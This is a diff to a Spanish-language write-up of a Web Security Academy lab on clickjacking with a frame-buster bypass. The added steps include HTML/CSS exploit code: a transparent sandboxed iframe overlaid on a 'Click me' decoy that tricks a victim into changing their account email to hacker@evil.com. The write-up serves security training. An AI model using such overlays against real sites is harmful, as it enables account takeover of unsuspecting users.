@@ -69,6 +69,10 @@ Cómo lo evitamos:
 - Esto neutraliza el frame buster y permite mostrar el contenido sin activar el reemplazo.
 
 
+Sabemos que se puede prellenar el valor del parámetro `email` tramitándolo por GET:
+![image](https://github.com/user-attachments/assets/ea697154-6728-495b-b6a7-3fa0d3a5cad1)
+
+
 Al igual que en el laboratorio anterior, accedemos al exploit server y procedemos a crean nuestra página maliciosa utilizando nuestro script:
 ```javascript
 <style>
@@ -96,4 +100,33 @@ Al igual que en el laboratorio anterior, accedemos al exploit server y procedemo
 src="https://0a4a006b0369302b806dd0ee00910067.web-security-academy.net/my-account?email=hacker@evil.com"></iframe>
 ```
 
+Hacemos click en `Store` y luego en `View exploit`:
+![image](https://github.com/user-attachments/assets/f29ed268-3e30-4360-98d6-5de2afa2b9cc)
 
+Lo primero a resaltar es que no se activa el Frame Buster, no se activa el mensaje "This page cannot be framed”.
+
+El paso siguiente sería bajar un poco más el texto `Click me` para hacerlo coincidir con el botón `Update email`:
+```javascript
+<style>
+    iframe {
+        position: relative;
+        width: 500px;
+        height: 700px;
+        opacity: 0.1;
+        z-index: 2;
+    }
+    div {
+        position: absolute;
+        top: 440px;
+        left: 70px;
+        z-index: 1;
+        background: #fff;
+        padding: 10px;
+        font-weight: bold;
+        cursor: pointer;
+    }
+</style>
+
+<div>Click me</div>
+<iframe sandbox="allow-forms"
+src="https://0a4a006b0369302b806dd0ee00910067.web-security-academy.net/my-account?email=hacker@evil.com"></iframe>
